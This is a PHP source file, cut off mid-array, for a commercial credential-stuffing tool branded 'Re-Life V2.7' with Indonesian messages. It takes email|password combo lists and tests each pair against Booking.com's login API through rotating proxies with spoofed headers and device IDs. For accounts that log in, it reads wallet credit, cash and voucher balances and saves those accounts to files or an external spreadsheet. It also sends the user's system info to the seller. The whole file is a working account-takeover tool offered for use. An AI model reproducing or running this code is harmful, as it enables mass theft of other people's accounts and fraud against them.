<?php
date_default_timezone_set('Asia/Jakarta');
ini_set("memory_limit", "-1");
// error_reporting(0);
require 'vendor/autoload.php';

use jc21\CliTable;

require 'function.php';
require 'config.php';

$table = new CliTable;
$tablethread = new CliTable;
$tablefitur = new CliTable;

$curlmail = new \RollingCurl\RollingCurl();
$curlpass = new \RollingCurl\RollingCurl();
$curlball = new \RollingCurl\RollingCurl();
$curlhide = new \RollingCurl\RollingCurl();
$fitur = new Booking();

/* Coloring Zone */

$fitur->Black = "\033[0;30m";
$fitur->Red = "\033[0;31m";
$fitur->Green = "\033[0;32m";
$fitur->Yellow = "\033[0;33m";
$fitur->Blue = "\033[0;34m";
$fitur->Purple = "\033[0;35m";
$fitur->Cyan = "\033[0;36m";
$fitur->White = "\033[0;37m";
$fitur->YellowBold = "\033[1;33m";
$fitur->RedBold = "\033[1;31m";
$fitur->GreenBold = "\033[1;32m";
/* Coloring Zone */

if (!isset($config['apikey'])) {
    echo $fitur->YellowBold . '[!] Apikey Harus Diisi' . $fitur->White;
    die();
}
$validasi = $fitur->validasiapikey($config['apikey']);
$pengumuman = $fitur->pengumuman();
echo "
    " . $fitur->White . "    [+] Berita Terupdate
" . $fitur->Green;
$nobrita = 0;
foreach ($pengumuman as $berita) {
    foreach ($berita as $news) {
        # code...
        $nobrita++;
        if ($nobrita > 1) {
            print_r("        " . $news->Judul . ": " . $news->Pesan . PHP_EOL);
        }
    }
    continue;
}
// sleep(5);
if ($validasi['status']) {
    echo "
    
                " . $fitur->Red . "    ┳┓     ┓ •┏  
                    ┣┫┏┓•  ┃ ┓╋┏┓
                    ┛┗┗ •  ┗┛┗┛┗      
                " . $fitur->YellowBold . "    [!] ./Re-Life V2.7
                " . $fitur->Blue . "    [-] Apikey: " . $validasi['apikey'] . "
                    [-] Durasi: " . parseDate($validasi['durasi']) . "
                    [-] Thread Allowed: " . $validasi['thread'] . "
                    [!] Message: " . $validasi['message'] . "
                " . $fitur->Green . "    [+]-------------[ Re-Life Foundation ]-------------[+]" . PHP_EOL;
} else {
    echo "
    
                " . $fitur->Red . "    ┳┓     ┓ •┏  
                    ┣┫┏┓•  ┃ ┓╋┏┓
                    ┛┗┗ •  ┗┛┗┛┗      
                " . $fitur->YellowBold . "    [!] ./Re-Life V2.7
                " . $fitur->Blue . "    [!] Apikey " . $validasi['message'] . "
                " . $fitur->Green . "    [+]-------------[ Re-Life Foundation ]-------------[+]" . PHP_EOL;

    daftarharga:

    echo PHP_EOL . $fitur->YellowBold . "[+] Telegram: @relifefound [+]" . PHP_EOL;
    echo $fitur->YellowBold . "[+] Jam Operasional: 09:00 AM - 04:00 PM [+]" . PHP_EOL;
    echo $fitur->YellowBold . "[+] Daftar List Harga Penyewaan Perbulan [+]" . PHP_EOL;

    $table->setTableColor('blue');
    $table->setHeaderColor('cyan');
    $table->addField('Bulan', 'bulan', true, 'white');
    $table->addField('Harga', 'harga', true, 'white');
    $table->addField('Thread Mesin Bot', 'thread', false, 'white');
    $table->injectData($dataharga);
    $table->display();

    echo $fitur->YellowBold . "[+] Daftar List Harga Penambahan Thread Mesin Bot [+]" . PHP_EOL;
    $tablethread->setTableColor('blue');
    $tablethread->setHeaderColor('cyan');
    $tablethread->addField('Thread Mesin Bot', 'thread', false, 'white');
    $tablethread->addField('Harga', 'harga', false, 'white');
    $tablethread->addField('Masa Berlaku', 'berlaku', false, 'white');
    $tablethread->injectData($datathread);
    $tablethread->display();

    echo $fitur->YellowBold . "[+] Daftar Fitur Re-Life [+]" . PHP_EOL;
    $tablefitur->setTableColor('blue');
    $tablefitur->setHeaderColor('cyan');
    $tablefitur->addField('Fitur', 'fitur', false, 'white');
    $tablefitur->addField('Keterangan', 'keterangan', false, 'white');
    $tablefitur->injectData($daftarfitur);
    $tablefitur->display();
    die();
}


if (!empty($fitur->getSystemInfo())) {
    $fitur->logsprogram($fitur->getSystemInfo(), $config['apikey'], $validasi['apikey']);
}
if (preg_match('/Masa Berlaku Sudah Habis/i', $validasi['message'])) {
    goto daftarharga;
}

if (!file_exists('list')) {
    mkdir('list', 0777, true);
    die();
}

if ($config['thread'] > $validasi['thread']) {
    echo $fitur->Yellow . '[!] Thread Yang Kamu Gunakan Melewati Batas Yang Telah Ditentukan' . $fitur->White;
    die();
}

$fitur->postbal = '{"operationName":"WalletBalance","variables":{},"query":"query WalletBalance { walletSummary { balance { credits { total { raw prettified currency } cash { raw prettified currency } } rewards { upcoming { monetary { count amount { prettified } } nonMonetary { count items { type title count } } } } vouchers { count amount { prettified } } spendable { prettified raw currency } } attributes { hasWallet hasReceivedVouchers walletStatus { isDisabled } } } walletBookLinks { spendRewardLinks { title description imageUrl link { deepLink href } } } walletFeaturedOffers { type title description iconUrl cta { title link { deepLink href } } } walletExplanationWidget { items { title description asset { assetName setName } } cta { title link { href } } } walletNotifications { id title description isDismissable type position icon { category name } displayConfig { check maxTimes } cta { title link { deepLink href to type } } } }"}';
$fitur->external = $config['external_link_tosave'];
$linkmail = "https://account.booking.com/api/identity/authenticate/v1.0/enter/email/submit";
$linkpass = "https://account.booking.com/api/identity/authenticate/v1.0/sign_in/password/submit";

if (strtoupper($config['proxytype']) == "HTTP") {
    $type = CURLPROXY_HTTP;
} elseif (strtoupper($config['proxytype']) == "HTTP_1_0") {
    $type = CURLPROXY_HTTP_1_0;
} elseif (strtoupper($config['proxytype']) == "HTTPS") {
    $type = CURLPROXY_HTTPS;
} elseif (strtoupper($config['proxytype']) == "SOCKS4") {
    $type = CURLPROXY_SOCKS4;
} elseif (strtoupper($config['proxytype']) == "SOCKS4A") {
    $type = CURLPROXY_SOCKS4A;
} elseif (strtoupper($config['proxytype']) == "SOCKS5_HOSTNAME") {
    $type = CURLPROXY_SOCKS5_HOSTNAME;
} elseif (strtoupper($config['proxytype']) == "SOCKS5") {
    $type = CURLPROXY_SOCKS5;
} else {
    echo $fitur->YellowBold . '[!] Type Proxy Kamu Tidak Ada Dalam Daftar' . PHP_EOL . $fitur->White;
    echo $fitur->Red . '[!] Gunakan Type Yang Sesuai Dengan Proxy Kamu ya. Berikut List Proxy nya' . PHP_EOL . $fitur->White;
    $daftarsocks = [
        [
            'type' => 'SOCKS5',
        ],
        [
            'type' => 'SOCKS5_HOSTNAME',
        ],
        [
            'type' => 'SOCKS4A',
        ],
        [
            'type' => 'SOCKS4',
        ],
        [
            'type' => 'HTTPS',
        ],
        [
            'type' => 'HTTP_1_0',
        ],
        [
            'type' => 'HTTP',
        ],
    ];
    $tablethread->setTableColor('blue');
    $tablethread->setHeaderColor('cyan');
    $tablethread->addField('Daftar Type Proxy', 'type',    false,                               'white');
    $tablethread->injectData($daftarsocks);
    $tablethread->display();
    die();
}

/* [ Pengecekkan Configurasi ] */
if ($config['proxyserver']) {
    if (empty($config['serverorip_proxy'])) {
        echo $fitur->YellowBold . '[!] Proxy Server or IP Tidak Boleh Kosong' . $fitur->White . PHP_EOL;
        die();
    }
    if ($config['proxy_auth']) {
        if (!isset($config['proxyuser'])) {
            echo $fitur->YellowBold . "[!] ProxyUser Perlu Diisi" . $fitur->White . PHP_EOL;
            die();
        }
    }
} else {
    echo $fitur->YellowBold . '[!] Wajib Menggunakan Proxy' . $fitur->White . PHP_EOL;
    die();
}
/* [ Pengecekkan Configurasi ] */
$files = glob('list/*.txt');

if (!empty($files)) {
    if ($config['thread'] < 2) {
        echo $fitur->Red . "[!] Thread Minimal 2" . $fitur->White . PHP_EOL;
        die();
    }
    if ($config['save_on_internal'] && $config['save_on_external']) {
        echo $fitur->YellowBold . '[!] Pilih salah satu untuk menyimpan file';
        echo $fitur->White;
        die();
    }
    if ($config['save_on_internal'] == false && $config['save_on_external'] == false) {
        echo $fitur->YellowBold . '[!] Save Configuration Belum Di Setting' . $fitur->White;
        die();
    }
    if (!file_exists('result')) {
        mkdir('result', 0777, true);
    }
    if (!file_exists('logs')) {
        mkdir('logs', 0777, true);
    }

    $lastUsedProxyIndex = 0;
    function getNextProxy($data)
    {
        global $lastUsedProxyIndex;
        $proxyList = file($data, FILE_IGNORE_NEW_LINES);
        $lastUsedProxyIndex++;

        if ($lastUsedProxyIndex >= count($proxyList)) {
            $lastUsedProxyIndex = 0;
            sleep(8);
        }
        $nextProxy = $proxyList[$lastUsedProxyIndex];
        return $proxyList[$lastUsedProxyIndex];
    }

    $mail = [];
    $pass = [];
    $empas = [];
    $passcount = 0;
    $mailno = 0;
    $accno = 0;
    $dataprocessing = 0;
    $deviceid = [];
    $cekberkala = 50000;
    $restart = 100000;
    $duplicate = 0;
    $skip1 = 0;
    $skip2 = 0;

    foreach ($files as $filelist) {
        $listof = preg_split(
            '/\n|\r\n?/',
            trim(file_get_contents($filelist))
        );

        $lengthold = null;
        foreach ($listof as $list => $line) {
            $mailcount = count($listof);


            if ($config['detectgenerate']) {
                $lengthnow = strlen($line);
                if ($lengthold == strlen($line)) {
                    print_r($fitur->YellowBold . "[!] Anti Generate Detect - Skip Checking For: " . $line . PHP_EOL);
                    continue;
                }
            }
            $data = $fitur->parseemail($line);
            if ($data == false) {
                print_r($fitur->Yellow . "[!] Format Empas Tidak Sesuai: " . $line . PHP_EOL);
                continue;
            }
            $error_check = checkempty($data);

            if ($error_check != 'valid') {
                echo $error_check . PHP_EOL;
                continue;
            }
            $getdomenemail = explode("@", $data['email']);

            if (isset(array_flip($blocked['skip_domain'])[trim(strtolower($getdomenemail[1]))])) {
                print_r($fitur->Yellow . "[!] Domain Blocked for: " . $line . PHP_EOL);
                if (!file_exists('list/blocked')) {
                    mkdir('list/blocked', 0777, true);
                }
                file_put_contents('list/blocked/' . $getdomenemail[1] . ".txt", $line . PHP_EOL, FILE_APPEND);
                unset($listof[$list]);
                file_put_contents($filelist, implode(PHP_EOL, $listof) . PHP_EOL);
                $skip1++;
                continue;
            }
            // Mengambil bagian setelah titik terakhir
            $parts = explode('.', $getdomenemail[1]);
            $last_part = end($parts);

            if (isset(array_flip($blocked['skip_country'])[trim(strtolower($last_part))])) {
                print_r($fitur->Yellow . "[!] Country Blocked for: " . $line . PHP_EOL);
                if (!file_exists('list/blocked')) {
                    mkdir('list/blocked', 0777, true);
                }
                file_put_contents('list/blocked/' . $last_part . ".txt", $line . PHP_EOL, FILE_APPEND);
                unset($listof[$list]);
                file_put_contents($filelist, implode(PHP_EOL, $listof) . PHP_EOL);
                $skip2++;
                continue;
            }

            if ($skip1 == 5000 || $skip2 == 5000) {
                file_put_contents($filelist, implode(PHP_EOL, $listof) . PHP_EOL);
                die();
            }

            $dataprocessing++;

            if ($dataprocessing % $cekberkala == 0) {
                $cekapi = $fitur->validasiapikey($config['apikey']);
                $expDateObj = new DateTime($cekapi['durasi']);
                $currentDateObj = new DateTime(date('Y-m-d'));

                if ($currentDateObj > $expDateObj) {
                    echo $fitur->RedBold . '[!] Proses Dihentikan, Masa Berlaku Apikey Kamu Habis' . $fitur->White;
                    goto daftarharga;
                }
            }

            $deviceid[$data['email']] = $fitur->generateUUID();

            $linkbal = 'https://mobile-apps.booking.com/json/mobile.dml?user_os=9&user_version=' . $config['appversion'] . '-android&device_id=' . $deviceid[$data['email']] . '&network_type=wifi&languagecode=en-us&display=large_hdpi&affiliate_id=337862&currency_code=IDR&user_latitude=31.249160&user_longitude=121.487898';


            $checking_on = checked_config($config, $type, $fitur->MailHeaderRandom(), $fitur->postdata($data['email'], false, false, $deviceid[$data['email']])['email'], $fitur, null);
            if (isset($empas[$data['email']])) {
                $duplicate++;
                print_r($fitur->YellowBold . "[!] Email Duplicate Ditemukan - Skip Checking " . $data['email'] . "|" . $data['pass'] . PHP_EOL);
                continue;
            } else {
                if (empty($data['email']) || empty($data['pass'])) {
                    continue;
                }
                $pass[$data['email']] = $data['pass'];
                $mail[$data['pass']] = $data['email'];
                $empas[$data['email']] = $data['email'] . "|" . $data['pass'];
                if (!empty($pass[$data['email']]) && !empty($mail[$data['pass']]) && !empty($empas[$data['email']])) {
                    $curlmail->setOptions($checking_on)->post($linkmail, json_encode($fitur->postdata($data['email'], false, false, $deviceid[$data['email']])['email']), $fitur->MailHeaderRandom());
                }
            }

            unset($listof[$list]);
            if ($dataprocessing % 5000 == 0) {
                if (strtolower($config['checkingmode']) == 'email' || strtolower($config['checkingmode']) == 'full') {
                    $curlmail->setCallback(function (\RollingCurl\Request $request, \RollingCurl\RollingCurl $curlmail) use (&$fitur, &$curlpass, &$mail, &$pass, &$checking_on, &$linkpass, &$linkbal, &$mailrun, &$empas, &$passcount, &$deviceid, &$config, &$type, &$mailno, &$mailcount) {
                        $respon = json_decode($request->getResponseText());
                        $deviceini = json_decode($request->getPostData());

                        $callresponse = $fitur->validasiEmail($respon, $empas[$deviceini->identifier->value]);
                        if (!empty($respon->identifier->value)) {

                            if (preg_match("/Anomali/i", $callresponse)) {
                                file_put_contents('result/anomali.txt', $empas[$deviceini->identifier->value] . PHP_EOL, FILE_APPEND);
                            }
                            if (isset($respon->error[0])) {
                                $mailno++;

                                $mailrun = $fitur->GreenBold . "[ $mailno/$mailcount ] " . $fitur->Yellow;
                                print_r($mailrun . "// Checking Email //--> " . $callresponse . $fitur->RedBold . " => " . $fitur->White . $empas[$deviceini->identifier->value] . " ./Re-Life");
                            } else {
                                $mailno++;

                                $mailrun = $fitur->GreenBold . "[ $mailno/$mailcount ] " . $fitur->Yellow;
                                if (isset($respon->nextStep)) {
                                    if ($respon->nextStep == 'STEP_SIGN_IN__PASSWORD') {
                                        file_put_contents('result/live-email.txt', $empas[$deviceini->identifier->value] . PHP_EOL, FILE_APPEND);
                                        $passcount++;
                                        if ($config['display']) {
                                            print_r($mailrun . "// Checking Email //--> " . $callresponse . $fitur->RedBold . " => " . $fitur->White . $empas[$deviceini->identifier->value] . " ./Re-Life");
                                        }
                                        $curlpass->setOptions(checked_config(
                                            $config,
                                            $type,
                                            $fitur->PassHeaderRandom(),
                                            $fitur->postdata($pass[$respon->identifier->value])['pass'],
                                            $fitur,
                                            null
                                        ))->post(
                                            $linkpass,
                                            json_encode($fitur->postdata($deviceini->identifier->value, $pass[$respon->identifier->value], $respon->context->value, $deviceini->deviceContext->deviceId)['pass']),
                                            $fitur->PassHeaderRandom()
                                        );
                                    } else {
                                        if ($config['display']) {
                                            print_r($mailrun . "// Checking Email //--> " . $callresponse . $fitur->RedBold . " => " . $fitur->White . $empas[$deviceini->identifier->value] . " ./Re-Life");
                                        }
                                    }
                                } else {
                                    print_r($mailrun . "// Checking Email //--> " . $callresponse . $fitur->RedBold . " => " . $fitur->White . $empas[$deviceini->identifier->value] . " ./Re-Life");
                                }
                            }
                        }

                        echo PHP_EOL;
                        $curlmail->clearCompleted();
                        // $curlmail->prunePendingRequestQueue();
                        unset($pass[$deviceini->identifier->value]);
                        // unset($deviceid[$deviceini->identifier->value]);
                    })->setSimultaneousLimit((int) $config['thread'])->execute();
                } elseif (strtolower($config['checkingmode'] == 'email')) {
                    continue;
                } else {
                    echo $fitur->YellowBold . '[!] Mode Pengecekkan Yang Kamu Masukkin Tidak Tersedia' . $fitur->White;
                    die();
                }
                sleep($config['delay']);
                if (strtolower($config['checkingmode']) == 'full') {
                    $curlpass->setCallback(function (\RollingCurl\Request $call, \RollingCurl\RollingCurl $curlpass) use (&$mail, &$pass, &$accno, &$linkbal, &$curlhide, &$passcount, &$fitur, &$config, &$curlball, &$type, &$empas, &$deviceid) {
                        $accno++;
                        $accrun = $fitur->Blue . "[ $accno/$passcount ] ";
                        $pasponse = json_decode($call->getResponseText());
                        $getpost = json_decode($call->getPostData());
                        if (!empty($empas[$mail[$getpost->authenticator->value]])) {
                            $auth_respon = $fitur->validasiAuth($pasponse, $empas[$mail[$getpost->authenticator->value]]);
                            print_r($accrun . "// Checking Auth // -->" . $auth_respon . "=> " . $fitur->White . $empas[$mail[$getpost->authenticator->value]]);
                            if (preg_match('/Login/i', $auth_respon)) {
                                $checkingbal_on = checked_config($config, $type, $fitur->header($pasponse->payloadAuthenticated->mobileToken, $pasponse->payloadAuthenticated->accessToken)['bal'], null, $fitur, 'balance');
                                $curlball->setOptions($checkingbal_on)->post($linkbal, $fitur->postbal, $fitur->header($pasponse->payloadAuthenticated->mobileToken, $pasponse->payloadAuthenticated->accessToken)['bal']);
                                $curlball->setCallback(function (\RollingCurl\Request $ball, \RollingCurl\RollingCurl $curlball) use (&$empas, &$accno, &$ballno, &$fitur, &$getpost, &$mail, &$config) {
                                    $balres = json_decode($ball->getResponseText());
                                    $getbaldata = $fitur->parsein($balres);
                                    $dataresult = $empas[$mail[$getpost->authenticator->value]] . " Credit: " . $getbaldata['credit'] . " |" . " Pending: " . $getbaldata['pending'] . " (" . $getbaldata['countpending'] . ")" . " |" . " Cash: " . $getbaldata['cash'] . "|" . " Voucher: " . $getbaldata['voucher'];

                                    if ($getbaldata['status'] == 'save') {
                                        if ($config['save_on_external']) {
                                            $fitur->spreadsheet($dataresult);
                                        } elseif ($config['save_on_internal']) {
                                            file_put_contents('result/akun-bersaldo.txt', $dataresult . PHP_EOL, FILE_APPEND);
                                        }
                                    } else {
                                        if ($config['save_on_external']) {
                                            // $fitur->spreadsheet($dataresult);
                                        } elseif ($config['save_on_internal']) {
                                            file_put_contents('result/live-account.txt', $dataresult . PHP_EOL, FILE_APPEND);
                                        }
                                    }
                                    print_r($fitur->GreenBold . " Credit: " . $getbaldata['credit'] . " |" . " Pending: " . $getbaldata['pending'] . " (" . $getbaldata['countpending'] . ")" . " |" . " Cash: " . $getbaldata['cash'] . "|" . " Voucher: " . $getbaldata['voucher']);
                                })->setSimultaneousLimit((int)$config['thread'])->execute();
                            } else {
                                print_r(' ./Re-Life');
                            }
                            echo PHP_EOL;
                            $curlpass->clearCompleted();
                            unset($deviceid[$mail[$getpost->authenticator->value]]);
                            unset($mail[$getpost->authenticator->value]);
                        }
                    })->setSimultaneousLimit((int)$config['thread'])->execute();
                } elseif (strtolower($config['checkingmode'] == 'email')) {
                    continue;
                } else {
                    echo $fitur->YellowBold . '[!] Mode Pengecekkan Yang Kamu Masukkin Tidak Tersedia' . $fitur->White;
                    die();
                }
                $accno = 0;
                file_put_contents($filelist, implode(PHP_EOL, $listof) . PHP_EOL);

                sleep($config['delay']);
                $passcount = 0;
                unset($data);
                gc_collect_cycles();
                die();
            }
            $mailno = 0;
            if ($dataprocessing % $restart == 0) {
                echo $fitur->YellowBold . "[!] Membersihkan Memory Re-Life Checking Setiap 100.000 Pengecekkan" . $fitur->White;
                die();
            }

            if ($config['detectgenerate']) {
                $lengthold = $lengthnow;
            }
        }

        if (strtolower($config['checkingmode']) == 'email' || strtolower($config['checkingmode']) == 'full') {
            $curlmail->setCallback(function (\RollingCurl\Request $request, \RollingCurl\RollingCurl $curlmail) use (&$fitur, &$curlpass, &$mail, &$pass, &$checking_on, &$linkpass, &$linkbal, &$mailrun, &$empas, &$passcount, &$deviceid, &$config, &$type, &$mailno, &$mailcount) {
                $mailno++;

                $mailrun = $fitur->GreenBold . "[ $mailno/$mailcount ] " . $fitur->Yellow;
                $respon = json_decode($request->getResponseText());
                $deviceini = json_decode($request->getPostData());

                if (!empty($respon->identifier->value)) {
                    $callresponse = $fitur->validasiEmail($respon, $empas[$deviceini->identifier->value]);
                    if (isset($respon->error[0])) {
                        print_r($mailrun . "// Checking Email //--> " . $callresponse . $fitur->RedBold . " => " . $fitur->White . $empas[$deviceini->identifier->value]);
                    } else {
                        if (isset($respon->nextStep)) {
                            if ($respon->nextStep == 'STEP_SIGN_IN__PASSWORD') {
                                $passcount++;
                                if ($config['display']) {
                                    print_r($mailrun . "// Checking Email //--> " . $callresponse . $fitur->RedBold . " => " . $fitur->White . $empas[$deviceini->identifier->value] . " ./Re-Life");
                                }
                                $curlpass->setOptions($checking_on)->post($linkpass, json_encode($fitur->postdata($deviceini->identifier->value, $pass[$respon->identifier->value], $respon->context->value, $deviceid[$deviceini->identifier->value])['pass']), $fitur->PassHeaderRandom());
                            } else {
                                if ($config['display']) {
                                    print_r($mailrun . "// Checking Email //--> " . $callresponse . $fitur->RedBold . " => " . $fitur->White . $empas[$deviceini->identifier->value] . " ./Re-Life");
                                }
                            }
                        } else {
                            print_r($mailrun . "// Checking Email //--> " . $callresponse . $fitur->RedBold . " => " . $fitur->White . $empas[$deviceini->identifier->value] . " ./Re-Life");
                        }
                    }
                }

                echo PHP_EOL;
                $curlmail->clearCompleted();
                // $curlmail->prunePendingRequestQueue();
                unset($pass[$deviceini->identifier->value]);
                // unset($deviceid[$deviceini->identifier->value]);
            })->setSimultaneousLimit((int) $config['thread'])->execute();
        } elseif (strtolower($config['checkingmode'] == 'email')) {
            continue;
        } else {
            echo $fitur->YellowBold . '[!] Mode Pengecekkan Yang Kamu Masukkin Tidak Tersedia' . $fitur->White;
            die();
        }
        sleep($config['delay']);
        if (strtolower($config['checkingmode']) == 'full') {
            $curlpass->setCallback(function (\RollingCurl\Request $call, \RollingCurl\RollingCurl $curlpass) use (&$mail, &$pass, &$curlhide, &$accno, &$linkbal, &$passcount, &$fitur, &$config, &$curlball, &$deviceid, &$type, &$empas) {
                $accno++;
                $accrun = $fitur->Blue . "[ $accno/$passcount ] ";
                $pasponse = json_decode($call->getResponseText());
                $getpost = json_decode($call->getPostData());
                if (!empty($empas[$mail[$getpost->authenticator->value]])) {
                    $auth_respon = $fitur->validasiAuth($pasponse, $empas[$mail[$getpost->authenticator->value]]);
                    print_r($accrun . "// Checking Auth // -->" . $auth_respon . "=> " . $fitur->White . $empas[$mail[$getpost->authenticator->value]] . " ./Re-Life");
                    if (preg_match('/Login/i', $auth_respon)) {
                        $checkingbal_on = checked_config($config, $type, $fitur->header($pasponse->payloadAuthenticated->mobileToken, $pasponse->payloadAuthenticated->accessToken)['bal'], null, $fitur, 'balance');
                        $curlball->setOptions($checkingbal_on)->post($linkbal, $fitur->postbal, $fitur->header($pasponse->payloadAuthenticated->mobileToken, $pasponse->payloadAuthenticated->accessToken)['bal']);
                        $curlball->setCallback(function (\RollingCurl\Request $ball, \RollingCurl\RollingCurl $curlball) use (&$empas, &$accno, &$ballno, &$fitur, &$getpost, &$mail, &$config) {
                            $balres = json_decode($ball->getResponseText());
                            $getbaldata = $fitur->parsein($balres);
                            $dataresult = $empas[$mail[$getpost->authenticator->value]] . " Credit: " . $getbaldata['credit'] . " |" . " Pending: " . $getbaldata['pending'] . " (" . $getbaldata['countpending'] . ")" . " |" . " Cash: " . $getbaldata['cash'] . "|" . " Voucher: " . $getbaldata['voucher'];

                            if ($getbaldata['status'] == 'save') {
                                if ($config['save_on_external']) {
                                    $fitur->spreadsheet($dataresult);
                                } elseif ($config['save_on_internal']) {
                                    file_put_contents('result/akun-bersaldo.txt', $dataresult . PHP_EOL, FILE_APPEND);
                                }
                            } else {
                                if ($config['save_on_external']) {
                                    // $fitur->spreadsheet($dataresult);
                                } elseif ($config['save_on_internal']) {
                                    file_put_contents('result/live-account.txt', $dataresult . PHP_EOL, FILE_APPEND);
                                }
                            }
                            print_r($fitur->GreenBold . " Credit: " . $getbaldata['credit'] . " |" . " Pending: " . $getbaldata['pending'] . " (" . $getbaldata['countpending'] . ")" . " |" . " Cash: " . $getbaldata['cash'] . "|" . " Voucher: " . $getbaldata['voucher']);
                        })->setSimultaneousLimit((int)$config['thread'])->execute();
                    } else {
                        print_r(' ./Re-Life');
                    }
                    echo PHP_EOL;
                    unset($deviceid[$mail[$getpost->authenticator->value]]);
                    unset($mail[$getpost->authenticator->value]);
                    $curlpass->clearCompleted();
                }
            })->setSimultaneousLimit((int)$config['thread'])->execute();
        } elseif (strtolower($config['checkingmode'] == 'email')) {
            continue;
        } else {
            echo $fitur->YellowBold . '[!] Mode Pengecekkan Yang Kamu Masukkin Tidak Tersedia' . $fitur->White;
            die();
        }
        $accno = 0;
        file_put_contents($filelist, implode(PHP_EOL, $listof) . PHP_EOL);
        sleep($config['delay']);
        $passcount = 0;
        unset($data);
        gc_collect_cycles();
        unlink($filelist);
        $mailcount = 0;
        $duplicate = 0;
        $mailno = 0;
        $curlmail->prunePendingRequestQueue();
        $curlpass->prunePendingRequestQueue();
        $curlball->prunePendingRequestQueue();
    }
} else {
    echo "[!] Masukkan List Kamu Di Folder List, Lalu Buka Bash Dengan Klik Kanan Terus Open Git Bash Here. Gunakan Perintah 'bash run.php' Untuk Menjalankan Program" . PHP_EOL;
    goto daftarharga;
}

function checkempty($data)
{
    global $fitur;
    if (empty($data['email']) || empty($data['pass'])) {
        $message = $fitur->YellowBold . '[!] Email Atau Password Kosong' . $data['email'] . "|" . $data['pass'] . $fitur->White;
    } else {
        $message = 'valid';
    }
    return $message;
}

function parseDate($iso8601String)
{
    // Extract the date part before the 'T'
    $date = strtok($iso8601String, 'T');
    return $date;
}

/* [ CHECKING CONFIGURATION ] */
function checked_config($config, $type, $header, $postdata, $fitur, $status)
{

    if ($status == 'balance') {
        if (file_exists($config['serverorip_proxy'])) {
            if ($config['proxy_auth']) {
                $curloptionsn = [
                    CURLOPT_USERAGENT => $fitur->generateua(),
                    CURLOPT_SSLVERSION => CURL_SSLVERSION_TLSv1_3,
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_POST => true,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false,
                    CURLOPT_POSTFIELDS => '{"operationName":"WalletBalance","variables":{},"query":"query WalletBalance { walletSummary { balance { credits { total { raw prettified currency } cash { raw prettified currency } } rewards { upcoming { monetary { count amount { prettified } } nonMonetary { count items { type title count } } } } vouchers { count amount { prettified } } spendable { prettified raw currency } } attributes { hasWallet hasReceivedVouchers walletStatus { isDisabled } } } walletBookLinks { spendRewardLinks { title description imageUrl link { deepLink href } } } walletFeaturedOffers { type title description iconUrl cta { title link { deepLink href } } } walletExplanationWidget { items { title description asset { assetName setName } } cta { title link { href } } } walletNotifications { id title description isDismissable type position icon { category name } displayConfig { check maxTimes } cta { title link { deepLink href to type } } } }"}',
                    CURLOPT_HTTPHEADER => $header,
                    CURLOPT_PROXY => getNextProxy($config['serverorip_proxy']),
                    CURLOPT_PROXYUSERPWD => $config['proxyuser'],
                    CURLOPT_PROXYTYPE => $type,
                    CURLOPT_TIMEOUT => $config['timeout'],
                    CURLOPT_CONNECTTIMEOUT => $config['connectiontimeout'],
                    // CURLOPT_SSL_CIPHER_LIST => 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:AES128-SHA',
                ];
            } else {
                $curloptionsn = [
                    CURLOPT_USERAGENT => $fitur->generateua(),
                    CURLOPT_SSLVERSION => CURL_SSLVERSION_TLSv1_3,
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_POST => true,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false,
                    CURLOPT_POSTFIELDS => '{"operationName":"WalletBalance","variables":{},"query":"query WalletBalance { walletSummary { balance { credits { total { raw prettified currency } cash { raw prettified currency } } rewards { upcoming { monetary { count amount { prettified } } nonMonetary { count items { type title count } } } } vouchers { count amount { prettified } } spendable { prettified raw currency } } attributes { hasWallet hasReceivedVouchers walletStatus { isDisabled } } } walletBookLinks { spendRewardLinks { title description imageUrl link { deepLink href } } } walletFeaturedOffers { type title description iconUrl cta { title link { deepLink href } } } walletExplanationWidget { items { title description asset { assetName setName } } cta { title link { href } } } walletNotifications { id title description isDismissable type position icon { category name } displayConfig { check maxTimes } cta { title link { deepLink href to type } } } }"}',
                    CURLOPT_HTTPHEADER => $header,
                    CURLOPT_PROXY => getNextProxy($config['serverorip_proxy']),
                    CURLOPT_PROXYTYPE => $type,
                    CURLOPT_TIMEOUT => $config['timeout'],
                    CURLOPT_CONNECTTIMEOUT => $config['connectiontimeout'],
                    // CURLOPT_SSL_CIPHER_LIST => 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:AES128-SHA',
                ];
            }
        } else {
            if ($config['proxy_auth']) {
                $curloptionsn = [
                    CURLOPT_USERAGENT => $fitur->generateua(),
                    CURLOPT_SSLVERSION => CURL_SSLVERSION_TLSv1_3,
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_POST => true,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false,
                    CURLOPT_HTTPHEADER => $header,
                    CURLOPT_POSTFIELDS => '{"operationName":"WalletBalance","variables":{},"query":"query WalletBalance { walletSummary { balance { credits { total { raw prettified currency } cash { raw prettified currency } } rewards { upcoming { monetary { count amount { prettified } } nonMonetary { count items { type title count } } } } vouchers { count amount { prettified } } spendable { prettified raw currency } } attributes { hasWallet hasReceivedVouchers walletStatus { isDisabled } } } walletBookLinks { spendRewardLinks { title description imageUrl link { deepLink href } } } walletFeaturedOffers { type title description iconUrl cta { title link { deepLink href } } } walletExplanationWidget { items { title description asset { assetName setName } } cta { title link { href } } } walletNotifications { id title description isDismissable type position icon { category name } displayConfig { check maxTimes } cta { title link { deepLink href to type } } } }"}',
                    CURLOPT_PROXY => $config['serverorip_proxy'],
                    CURLOPT_PROXYTYPE => $type,
                    CURLOPT_TIMEOUT => $config['timeout'],
                    CURLOPT_CONNECTTIMEOUT => $config['connectiontimeout'],
                    // CURLOPT_SSL_CIPHER_LIST => 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:AES128-SHA',
                    CURLOPT_PROXYUSERPWD => $config['proxyuser'],
                ];
            } else {
                $curloptionsn = [
                    CURLOPT_USERAGENT => $fitur->generateua(),
                    CURLOPT_SSLVERSION => CURL_SSLVERSION_TLSv1_3,
                    CURLOPT_RETURNTRANSFER => true,
